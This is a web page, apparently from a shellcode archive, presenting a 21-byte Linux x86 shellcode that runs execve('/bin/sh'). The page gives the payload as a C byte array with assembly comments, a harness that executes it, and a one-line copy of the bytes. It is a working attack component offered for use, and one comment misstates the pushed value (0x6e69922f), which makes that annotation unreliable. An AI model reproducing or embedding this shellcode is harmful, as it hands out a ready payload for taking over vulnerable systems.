<html><head><title>Linux/x86 - execve /bin/sh - 21 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]
  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org
  thanks : `ivan, milo, #oldschool crew
*/
 
int main(){
 
char sc[] = &quot;\x6a\x0b&quot; // push byte +0xb
&quot;\x58&quot; // pop eax
&quot;\x99&quot; // cdq
&quot;\x52&quot; // push edx
&quot;\x68\x2f\x2f\x73\x68&quot; // push dword 0x68732f2f
&quot;\x68\x2f\x62\x69\x6e&quot; // push dword 0x6e69922f
&quot;\x89\xe3&quot; // mov ebx, esp
&quot;\x31\xc9&quot; // xor ecx, ecx
&quot;\xcd\x80&quot;; // int 0x80
 
((void (*)()) sc)();
}
 
/*
sc[] = &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;
*/
 
--
ipv

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
